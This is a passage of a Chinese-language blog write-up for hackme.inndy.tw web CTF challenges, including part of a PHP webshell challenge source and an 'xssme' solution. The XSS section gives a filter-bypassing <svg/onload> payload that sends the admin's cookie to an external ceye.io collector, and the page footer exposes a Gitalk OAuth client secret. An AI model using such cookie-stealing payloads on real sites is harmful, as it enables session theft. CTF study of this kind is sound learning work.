class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'sig'</span>])) &#123;</span><br><span class="line">        $cmd = hash(<span class="string">'SHA512'</span>, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ^ (string) $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">        $key = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . sha1(<span class="string">'webshell.hackme.inndy.tw'</span>);</span><br><span class="line">        $sig = hash_hmac(<span class="string">'SHA512'</span>, $_GET[<span class="string">'cmd'</span>], $key);</span><br><span class="line">        <span class="keyword">echo</span> urlencode($cmd).<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $sig.<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        <span class="keyword">if</span> ($sig === (string) $_GET[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">            header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">            <span class="keyword">return</span> !!system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    highlight_file($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">run() ?: fuck();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/report_cybersecurity01_img/170.png" alt=""></p>
+<p>构造<code>cmd=ls -al&amp;sig=1</code>，得到参数，在网站上 get 传入脚本的参数进行尝试，并没有出现回显</p>
+<p>后来询问大佬得知这道题貌似挂了，好吧…QAQ</p>
+<h3 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h3><h4 id="描述-22"><a href="#描述-22" class="headerlink" title="描述"></a>描述</h4><p>XSS admin to steal flag</p>
+<h4 id="思路-22"><a href="#思路-22" class="headerlink" title="思路"></a>思路</h4><p>打开题目，发现是一个邮件的收发系统，先注册登录</p>
+<p><img src="/report_cybersecurity01_img/175.png" alt=""></p>
+<p>根据题目描述，我们应当是要想办法获取 admin 的身份信息从而获取 flag，由于之前做 XSS 的题目做的比较少，所以只想到了一个方法，就是发送包含 XSS 的邮件给管理员，当管理员阅读邮件后触发 XSS，将管理员的 cookie 发到用于接收 cookie 的平台</p>
+<p>因此我们先尝试一下发送 XSS 邮件，进入发送邮件的界面，试一试<code>&lt;script&gt;</code>标签</p>
+<p>果然没这么简单，对标签进行了过滤</p>
+<p><img src="/report_cybersecurity01_img/176.png" alt=""></p>
+<p>尝试改为大写<code>&lt;ScrIPt&gt;</code>，依旧不行</p>
+<p><img src="/report_cybersecurity01_img/177.png" alt=""></p>
+<p>然后就想到的是<code>&lt;img onerror&gt;</code>，试一试</p>
+<p><img src="/report_cybersecurity01_img/178.png" alt=""></p>
+<p>很明显也被过滤了，下一个想到的是<code>&lt;svg onload&gt;</code>，还是不行</p>
+<p><img src="/report_cybersecurity01_img/179.png" alt=""></p>
+<p>我佛了，再试试<code>&lt;svg/onload&gt;</code>吧</p>
+<p><img src="/report_cybersecurity01_img/180.png" alt=""></p>
+<p>哇，居然成了，那我们来利用<code>&lt;svg/load&gt;</code>来构造 payload</p>
+<p>采取最经典的打 cookie 方法<code>document.cookie</code>来拼接读取，寻找到 CEYE 平台来接受 cookie</p>
+<p>payload:<code>&lt;svg/onload=&quot;document.location=&#39;http://ugelgr.ceye.io/?&#39;+document.cookie&quot;&gt;</code></p>
+<p>在消息中看到 cookie</p>
+<p><img src="/report_cybersecurity01_img/181.png" alt=""></p>
+<p>解码得到了 flag:<code>FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;}</code></p>
+
+        </div>
+
+        
+        <section class="post-copyright">
+            
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>playmood</span>
+            </p>
+            
+            
+            
+            <p class="copyright-item">
+                <span>License:</span>
+                <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+            </p>
+            
+            
+
+        </section>
+        
+        <section class="post-tags">
+            <div>
+                <span class="iconfont icon-tags"></span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">
+                    << <span class="icon iconfont icon-rollback"></span>
+                </a>
+                <span>· </span>
+                <a href="/"><span class="icon iconfont icon-home"></span> >> </a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_web_writeup/">攻防世界_web_writeup</a>
+            
+        </section>
+        
+        <section class="post-gittalk">
+            <link rel="stylesheet" href="/css/gitalk.css">
+            <div id="gitalk-container"></div>
+            <script src="/js/gitalk.min.js"></script>
+            <script type="text/javascript">
+                var gitalk = new Gitalk({
+                    clientID: '1b42563e3240226378ff',
+                    clientSecret: 'cf624a8adc08bdab6213cb00279fd3dcb3ce4ff5',
+                    id: decodeURI(location.pathname),
+                    repo: 'playmood.github.io',
+                    owner: 'playmood',
+                    admin: 'playmood'
+                })
+                gitalk.render('gitalk-container')
+            </script>
+        </section>
+        <br/>
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 2019 playmood ICP证：<a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">湘ICP备19008111号-1</a></span>
+    </div>
+</footer>
+
+
+<script type="text/javascript" color="0,0,0" opacity="0.3" zindex="-2" count="99" src="/js/canvas-nest.js"></script>
+
+
+    </div>
+</body>
+</html>
